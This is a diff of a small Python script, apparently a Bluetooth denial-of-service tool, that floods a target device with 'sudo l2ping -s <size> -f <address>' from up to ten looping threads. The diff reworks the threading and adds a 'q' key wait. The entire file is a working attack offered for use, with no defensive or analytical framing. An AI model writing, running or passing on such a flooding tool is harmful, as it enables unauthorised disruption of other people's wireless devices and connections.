@@ -1,20 +1,31 @@
 #About: Script that uses l2ping to flood a device to interupt their bluetooth connection.
-#Version: 0.1
+#Version: 1.0
 import os
 import sys
 import time
 import subprocess
+import keyboard
 from threading import Thread
 
 abort_attack = False
 
-def attack(address, bulletSize, guns):
-    def do_attack():
-        while not abort_attack:
-            subprocess.run(["sudo", "l2ping", "-s", bulletSize, "-f", address])
+def createThreads(address, bulletSize, guns):
+    threads = []
     for i in range(guns):
-        Thread(target=attack, args=(address, bulletSize)).start()
-    return
+        t = Thread(target=attack, args=(address, bulletSize))
+        t.start()
+        threads.append(t)
+    return threads
+
+def attack(address, bulletSize):
+    while not abort_attack:
+        subprocess.run(["sudo", "l2ping", "-s", bulletSize, "-f", address])
+
+def stopThreads(threads):
+    global abort_attack
+    abort_attack = True
+    for t in threads: 
+        t.join()
 
 def main():
     print("Bluetooth Denial of Service")
@@ -26,10 +37,8 @@ def main():
         return
     bulletSize = input("Enter bullet size: ")
     guns = min(int(input("How many guns do you want to use? ")), 10)
-    
-    
-    attack(address, bulletSize)
-    input("Press enter to continue...")
+    createThreads(address, bulletSize, guns)
+    keyboard.wait('q')
     return
 
 main()
